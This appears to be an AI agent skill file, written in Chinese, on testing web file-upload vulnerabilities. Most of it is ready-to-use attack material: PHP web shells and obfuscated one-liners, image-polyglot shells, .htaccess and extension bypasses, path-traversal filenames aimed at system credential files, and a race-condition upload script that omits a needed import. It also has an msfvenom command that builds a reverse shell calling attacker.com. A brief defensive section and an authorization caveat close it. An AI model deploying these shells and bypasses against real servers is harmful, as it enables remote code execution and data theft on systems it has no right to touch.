---
name: file-upload-testing
description: 文件上传漏洞测试的专业技能和方法论
version: 1.0.0
---

# 文件上传漏洞测试

## 概述

文件上传功能是Web应用常见功能，但存在多种安全风险。本技能提供文件上传漏洞的检测、利用和防护方法。

## 漏洞类型

### 1. 未验证文件类型

**仅前端验证：**
```javascript
// 可被绕过
if (!file.name.endsWith('.jpg')) {
  alert('只允许上传图片');
}
```

### 2. 文件内容未验证

**仅检查扩展名：**
```php
// 危险代码
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. 路径遍历

**未过滤文件名：**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. 文件名覆盖

**可预测的文件名：**
```
uploads/1.jpg
uploads/2.jpg
```

## 测试方法

### 1. 基础检测

**测试各种文件类型：**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**测试双扩展名：**
```
shell.php.jpg
shell.jpg.php
```

**测试大小写：**
```
shell.PHP
shell.PhP
```

### 2. 内容类型绕过

**修改Content-Type：**
```
Content-Type: image/jpeg
# 但文件内容是PHP代码
```

**Magic Bytes：**
```php
// 在PHP代码前添加图片头
GIF89a<?php phpinfo(); ?>
```

### 3. 解析漏洞

**Apache解析漏洞：**
```
shell.php.xxx  # Apache可能解析为PHP
```

**IIS解析漏洞：**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx解析漏洞：**
```
shell.jpg%00.php
```

### 4. 竞争条件

**文件上传后立即访问：**
```python
# 上传.php文件，在上传完成但删除前访问
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## 利用技术

### PHP WebShell

**基础WebShell：**
```php
<?php system($_GET['cmd']); ?>
```

**一句话木马：**
```php
<?php eval($_POST['a']); ?>
```

**绕过过滤：**
```php
<?php
$_GET['cmd']($_POST['a']);
// 使用: ?cmd=system
```

### .htaccess利用

**上传.htaccess：**
```
AddType application/x-httpd-php .jpg
```

**然后上传shell.jpg（实际是PHP代码）**

### 图片马

**GIF图片马：**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG图片马：**
```bash
# 使用工具将PHP代码嵌入PNG
python3 png2php.py shell.php shell.png
```

### 文件包含配合

**如果存在文件包含漏洞：**
```
# 上传包含PHP代码的图片
# 然后通过文件包含执行
?file=uploads/shell.jpg
```

## 绕过技术

### 扩展名绕过

**双扩展名：**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**大小写：**
```
shell.PHP
shell.PhP
```

**特殊字符：**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type绕过

**修改请求头：**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes绕过

**添加文件头：**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### 代码混淆

**使用短标签：**
```php
<?= system($_GET['cmd']); ?>
```

**使用变量：**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## 工具使用

### Burp Suite

1. 拦截文件上传请求
2. 修改文件名和内容
3. 测试各种绕过技术

### Upload Bypass

```bash
# 使用各种技术测试文件上传
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell生成

```bash
# 生成各种WebShell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## 验证和报告

### 验证步骤

1. 确认可以上传恶意文件
2. 验证文件可以执行
3. 评估影响（命令执行、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和上传功能
- 可上传的文件类型和执行方式
- 完整的利用步骤和PoC
- 修复建议（文件类型验证、内容检查、安全存储等）

## 防护措施

### 推荐方案

1. **文件类型白名单**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **文件内容验证**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **重命名文件**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **隔离存储**
   - 文件存储在Web根目录外
   - 通过脚本代理访问
   - 禁用执行权限

5. **文件扫描**
   - 使用杀毒软件扫描
   - 检查文件内容
   - 移除可执行权限

6. **大小限制**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## 注意事项

- 仅在授权测试环境中进行
- 避免上传恶意文件到生产环境
- 测试后及时清理
- 注意不同服务器的解析差异